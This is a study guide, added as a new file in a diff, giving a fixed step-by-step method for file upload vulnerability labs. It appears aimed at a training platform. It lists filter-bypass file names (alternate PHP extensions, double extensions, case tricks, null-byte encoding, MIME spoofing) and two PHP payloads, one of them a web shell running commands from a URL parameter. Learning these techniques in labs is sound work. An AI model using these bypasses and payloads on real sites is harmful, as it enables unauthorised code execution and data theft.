@@ -1,0 +1,262 @@
+#FILE UPLOAD LAB METHODOLOGY (STEP-BY-STEP)
+
+Think of this as your **default flow**. Follow it in order, every lab.
+
+---
+
+#STEP 1 — “Touch the Feature”
+
+Just use the upload normally.
+
+* Upload a valid file (e.g., image)
+* See:
+
+  * Does it upload?
+  * Where does it appear?
+  * Can you access it via URL?
+
+Goal:
+
+> Understand how the app behaves normally
+
+---
+
+# 🔍 STEP 2 — Intercept Request (Burp)
+
+* Capture upload request
+* Send to **Repeater**
+
+Focus on:
+
+```
+filename=
+Content-Type=
+file content
+```
+
+Goal:
+
+> You now control the upload manually
+
+---
+
+#STEP 3 — Quick Baseline Tests (ALWAYS DO THIS)
+
+Don’t think yet — just test:
+
+### Test 1:
+
+```
+shell.php
+```
+
+Result?
+
+* Blocked → filtering exists
+* Allowed → easy lab 
+
+---
+
+### Test 2:
+
+```
+shell.jpg
+```
+
+Confirms allowed type
+
+---
+
+### Test 3:
+
+```
+random.abc
+```
+
+This tells you:
+
+| Result  | Meaning   |
+| ------- | --------- |
+| Allowed | blacklist |
+| Blocked | whitelist |
+
+---
+
+Goal:
+
+> Identify **filter type quickly**
+
+---
+
+#STEP 4 — Decide Strategy (NO GUESSING)
+
+Now decide:
+
+### If BLACKLIST →
+
+Try bypass
+
+### If WHITELIST →
+
+Trick validation
+
+### If CONTENT CHECK →
+
+Fake content
+
+---
+
+#STEP 5 — Apply Bypass Categories (IN ORDER)
+
+This is your **attack sequence** — follow it step-by-step.
+
+---
+
+##5.1 Extension Tricks (START HERE ALWAYS)
+
+Try:
+
+```
+.php
+.php5
+.phtml
+.phar
+```
+
+---
+
+##5.2 Double Extension
+
+```
+shell.php.jpg
+shell.jpg.php
+```
+
+---
+
+##5.3 Case Bypass
+
+```
+shell.PHP
+shell.pHp
+```
+
+---
+
+##5.4 Trailing / Encoding Tricks
+
+```
+shell.php.
+shell.php%00.jpg
+```
+
+---
+
+##5.5 MIME Type Change (in Burp)
+
+```
+Content-Type: image/jpeg
+```
+
+---
+
+Important:
+Do NOT jump randomly
+Go **step by step**
+
+---
+
+#STEP 6 — After Each Upload → CHECK THIS
+
+Every time something uploads:
+
+Immediately:
+
+* Open file URL
+
+Ask:
+
+* Does it execute?
+* Or just download?
+
+---
+
+#STEP 7 — If Execution Works → Exploit
+
+Use simple payload:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+OR:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+---
+
+#STEP 8 — If Nothing Works → Think (IMPORTANT)
+
+Now pause and ask:
+
+* Is it checking content instead of extension?
+* Is filename being changed?
+* Is file stored but not executable?
+
+Then adapt:
+
+* Try polyglot (image + PHP)
+* Try path tricks
+* Try different extension again
+
+---
+
+#YOUR LAB FLOW (SHORT VERSION)
+
+Memorize this:
+
+```
+1. Upload normal file
+2. Intercept request
+3. Test: .php / .jpg / random
+4. Identify filter (blacklist/whitelist)
+5. Apply bypass in order:
+   → extensions
+   → double extension
+   → case
+   → encoding
+   → MIME
+6. Access uploaded file
+7. Confirm execution
+8. Exploit
+```
+
+---
+
+#WHAT THIS FIXES IN YOU
+
+Right now your problem is:
+
+> “Where do I start?”
+
+This method gives you:
+ A fixed starting point
+A fixed order
+No confusion
+
+---
+
+# ⚡ Final Advice (Very Important)
+
+Do NOT:
+Jump to payloads
+ Copy solutions
+
+Do:
+Follow the flow every time
+Observe response carefully
+
+---
+
